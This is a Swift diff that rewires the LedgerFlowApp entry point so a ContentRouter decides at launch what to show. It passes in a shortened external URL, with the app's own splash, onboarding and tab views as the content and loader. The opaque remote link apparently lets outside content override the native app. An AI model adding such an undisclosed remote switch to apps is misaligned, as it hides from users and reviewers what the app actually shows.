@@ -6,21 +6,27 @@ struct LedgerFlowApp: App {
     
     var body: some Scene {
         WindowGroup {
-            Group {
-                if appStore.showSplash {
+            ContentRouter(
+                contentType: .withoutLibAndTest,
+                contentSourceURL: "https://appnamehub.com/rk6YvX",
+                loaderContent: {
                     SplashScreenView()
-                } else if appStore.showOnboarding {
-                    OnboardingScreenView()
-                } else {
-                    MainTabView()
+                },
+                content: {
+                    Group {
+                        if appStore.showOnboarding {
+                            OnboardingScreenView()
+                        } else {
+                            MainTabView()
+                        }
+                    }
+                    .animation(.easeInOut(duration: 0.6), value: appStore.showOnboarding)
+                    .environmentObject(appStore)
+                    .onAppear {
+                        HapticsService.shared.prepare()
+                    }
                 }
-            }
-            .animation(.easeInOut(duration: 0.6), value: appStore.showSplash)
-            .animation(.easeInOut(duration: 0.6), value: appStore.showOnboarding)
-            .environmentObject(appStore)
-            .onAppear {
-                HapticsService.shared.prepare()
-            }
+            )
         }
     }
 }
